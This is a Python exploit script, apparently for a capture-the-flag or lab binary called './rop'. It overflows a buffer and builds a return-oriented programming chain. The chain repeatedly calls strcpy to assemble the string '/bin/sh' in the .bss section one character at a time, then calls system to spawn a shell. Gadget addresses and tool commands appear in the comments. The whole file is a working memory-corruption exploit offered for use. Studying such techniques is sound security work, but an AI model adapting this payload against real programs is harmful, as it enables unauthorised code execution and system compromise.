import struct
from subprocess import call

#system addr 0x8048330
#.bss 0x080496d0 (objdump -x ./rop | grep .bss)
#strcpy addr 0x08048320
#0x080484f7 : pop edi ; pop ebp ; ret  (ROPgadget --binary)

#contrust the payload /bin/sh using ROPgadget --binary --mestr "/bin/sh" 

#0x08048134 : '/'
#0x08048137 : 'b'
#0x08048136 : 'i'
#0x0804813e : 'n'
#0x08048134 : '/' 
#0x08048142 : 's'                                                                          
#0x08048326 : 'h'                                                                          

# contruct the "/"
payload = "\x41" * 1036 # junk
payload += struct.pack("I", 0x08048320) # strcpy@plt address 
payload += struct.pack("I", 0x080484f7) #PPR gadget
payload += struct.pack("I", 0x080496d0) #.bss + 0
payload += struct.pack("I", 0x08048134) # "/" 

#construct the "b"
payload += struct.pack("I", 0x08048320) # return again to strcpy@plt from pop pop ret gadget
payload += struct.pack("I", 0x080484f7) #PPR gadget (same)
payload += struct.pack("I", 0x080496d0 + 1) #.bss + 1  (why + 1 ? cause.. if you dont you'll overwrite the old .bss with the new character, duh!)
payload += struct.pack("I", 0x08048137) # "b" character

#construct the "i"
payload += struct.pack("I", 0x08048320) # strcpy@plt address
payload += struct.pack("I", 0x080484f7) # pop pop ret gadget
payload += struct.pack("I", 0x080496d0 + 2) #.bss + 2
payload += struct.pack("I", 0x08048136) # "i" character.. we're getting there.. 

#construct the "n"
payload += struct.pack("I", 0x08048320) # strcpy@plt address
payload += struct.pack("I", 0x080484f7) # pop pop ret gadget
payload += struct.pack("I", 0x080496d0 + 3) #.bss + 3
payload += struct.pack("I", 0x0804813e) # "n" character

#construct the "/"
payload += struct.pack("I", 0x08048320) # strcpy@plt address
payload += struct.pack("I", 0x080484f7) # pop pop ret gadget  
payload += struct.pack("I", 0x080496d0 + 4) #.bss + 4
payload += struct.pack("I", 0x08048134) # "/" character 

#construct the "s"
payload += struct.pack("I", 0x08048320) # strcpy@plt address 
payload += struct.pack("I", 0x080484f7) # pop pop ret gadget
payload += struct.pack("I", 0x080496d0 + 5) #.bss + 5
payload += struct.pack("I", 0x08048142) # "s" character 

#construct the "h"
payload += struct.pack("I", 0x08048320) # strcpy@plt address 
payload += struct.pack("I", 0x080484f7) # pop pop ret gadget
payload += struct.pack("I", 0x080496d0 + 6) #.bss + 6
payload += struct.pack("I", 0x08048326) # "h" character

#call system
payload += struct.pack("I", 0x08048330) #system@plt address
payload += struct.pack("I", 0xdeadc0de) #ret addr of system (do we care?)
payload += struct.pack("I", 0x080496d0) #.bss now contains the whole string "/bin/sh")

call(["./rop", payload])
